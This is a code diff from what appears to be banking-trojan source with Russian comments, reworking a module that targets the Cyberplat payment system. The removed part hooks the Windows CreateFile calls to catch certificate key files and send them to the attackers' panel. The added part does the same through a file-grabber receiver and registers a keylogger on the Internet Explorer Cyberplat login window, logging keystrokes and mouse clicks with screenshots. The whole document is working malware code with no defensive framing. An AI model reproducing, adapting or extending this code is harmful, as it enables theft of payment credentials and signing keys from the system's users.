@@ -36,115 +36,59 @@ namespace KEYLOGSYSTEMS
 
 namespace Cyberplat
 {
-	typedef int (WINAPI *PConnect)(SOCKET s, const struct sockaddr *name, int namelen);
-	typedef HANDLE (WINAPI *PCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess,
-										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
-										  HANDLE hTemplateFile);
-	typedef HANDLE (WINAPI *PCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess,
-										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
-										  HANDLE hTemplateFile);
-
-	#define Hash_CreateFileW 0x8F8F102
-	#define Hash_CreateFileA 0x8F8F114
-	// Переменные для хранения казателей на реальные функции
-	PCreateFileW Real_CreateFileW = 0;
-	PCreateFileA Real_CreateFileA = 0;
 
 	//true - если файл является файлом ключем
-	bool IsFileKey( HANDLE file )
+static int GrabKeyFiles( FileGrabber::ParamEvent* e )
+{
+	DBG( "Cyberplat", "File: %s", e->fileName );
+	m_lstrcpy( e->nameSend, "file.key" );
+	return FileGrabber::SENDFILE | FileGrabber::STOPRECEIVER;;
+}
+
+static void Activeted( LPVOID Sender )
+{
+	DBG("Cyberplat", "Activeted");
+	FileGrabber::Init(FileGrabber::CREATEFILEA);
+	FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
+	rv->FuncReceiver = GrabKeyFiles;
+	rv->minSize = 400;
+	rv->maxSize = 3000;
+	rv->maska = "*oper*BEGIN*END*"; //файлы которые начинаются с BEGIN CERTIFICATE и заканчиваются END CERTIFICATE
+	FileGrabber::AddReceiver(rv);
+}
+
+static void Deactivate( LPVOID Sender )
+{
+	DBG("Cyberplat", "Deactivate");	
+	FileGrabber::Release();
+}
+
+	//http://www.cyberplat.ru/tech/online/
+	//https://portal.cyberplat.ru/cgi-bin/login.cgi
+
+static void Init()
+{
+	PKeyLogSystem S = KeyLogger::AddSystem("cyberplatweb", PROCESS_HASH_IE);
+	if( S != NULL )
 	{
-		if (file == INVALID_HANDLE_VALUE)
-			return false;
-
-		// Проверяем размер файла. Большие файлы игнорируем.
-		DWORD h;
-		DWORD fileSize = (DWORD)pGetFileSize( file, &h );
-		if( fileSize < 400 || fileSize > 3000 )
-        	return false;
-
-		//  читаем файл память
-		char* buf = (char*)MemAlloc(fileSize + 1);
-		if (buf == NULL)
-			return false;
-
-		DWORD size = 0;
-        pReadFile( file, buf, fileSize, &size, NULL ); //читаем весь файл в память
-		bool res = false;
-		if( *buf >= '0' && *buf <= '9' )  //в начале файла должно быть число
+		S->SendLogAsCAB = true;
+		S->OnActivate = Cyberplat::Activeted;
+		S->OnDeactivate = Cyberplat::Deactivate;
+		S->AlwaysLogMouse = LOG_MOUSE_SCREENSHOT;
+		char CyberplatCaption[] = {'И','д','е','н','т','и','ф','и','к','а','ц','и','я',' ','п','о','л','ь','з','о','в','а','т','е','л','я', 0};
+		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, NULL, (PCHAR)CyberplatCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
+		if( F1 )
 		{
-			buf[fileSize] = 0; //конец строки
-			//ищем блок BEGIN .... END, если есть, то это файл ключей
-			char* p = m_strstr( buf, "BEGIN" );
-			if( p )
+			PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, NULL, "*Клавиатура*", FILTRATE_PARENT_WND, LOG_MOUSE, 3);
+			if( F2 )
 			{
-				p = m_strstr( p, "END" ); //после BEGIN должен быть END
-				if( p ) 
-				{
-					res = true;
-					//отсылаем в админку
-					KeyLogger::AddFile( 0, "KeyFile", buf, fileSize );
-				}
+                F2->MouseLogWnd = MOUSE_LOG_WND_FILTER;
+				F2->PreFilter = F1;
 			}
 		}
-
-		MemFree(buf);
-		// Восстанавливаем позицию курсора
-		pSetFilePointer( file, 0, 0, FILE_BEGIN );
-		return res;
 	}
+}
 
-    HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
-	{
-		HANDLE file = Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
-		if( dwDesiredAccess & GENERIC_READ )
-		{
-			if( lpFileName[0] != '/' ) //игнорируем разные порты и пайпы
-			{
-				//DBG("Cyberplat", "Name file(W) %ls", lpFileName );
-				if( IsFileKey(file) )
-				{
-					DBG("Cyberplat", "Key file(W) %ls", lpFileName );
-				}
-			}
-		}
-		return file;
-	}
-
-	HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
-	{
-		HANDLE file = Real_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
-		if( dwDesiredAccess & GENERIC_READ )
-		{
-			if( lpFileName[0] != '/' ) //игнорируем разные порты и пайпы
-			{
-				//DBG("Cyberplat", "Name file(A) %s", lpFileName );
-				if( IsFileKey(file) )
-				{
-					DBG("Cyberplat", "Key file(A) %s", lpFileName );
-				}
-			}
-		}
-		return file;
-	}
-
-	void Grabber(LPVOID Sender)
-	{
-		if( Real_CreateFileW == 0 )
-		{
-	        // Для перехвата ключа ставим хук на открытие файла
-			if (HookApi(DLL_KERNEL32, Hash_CreateFileW, &Hook_CreateFileW) )
-			{
-				__asm mov [Real_CreateFileW], eax
-			}
-			if (HookApi(DLL_KERNEL32, Hash_CreateFileA, &Hook_CreateFileA) )
-			{
-				__asm mov [Real_CreateFileA], eax
-			}
-		}
-		DBG("Cyberplat", "Start");
-	}
 }
 
 // ---------------------------------------------------------------------------
@@ -216,20 +160,6 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		Rafa::Init();
 	#endif
 
-	//http://www.cyberplat.ru/tech/online/
-	//https://portal.cyberplat.ru/cgi-bin/login.cgi
-
-	PKeyLogSystem S = KeyLogger::AddSystem("cyberplatweb", PROCESS_HASH_IE);
-	if( S != NULL )
-	{
-		S->SendLogAsCAB = true;
-
-		S->OnActivate = Cyberplat::Grabber;
-		char CyberplatCaption[] = {'И','д','е','н','т','и','ф','и','к','а','ц','и','я',' ','п','о','л','ь','з','о','в','а','т','е','л','я', 0};
-		KeyLogger::AddFilter(S, true, true, NULL, (PCHAR)CyberplatCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
-	}
-
-
 	// Добавляем QWidjet
 //	S = KeyLogger::AddSystem("qwidget", PROCESS_HASH_IE);
 //	if (S != NULL)
@@ -238,6 +168,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 //		KeyLogger::AddFilter(S, QWidgetClass, NULL, FILTRATE_PARENT_WND, LOG_ALL, 3);
 //	}
 
+	Cyberplat::Init();
 
 
 	// Регистрируем систему для сбер
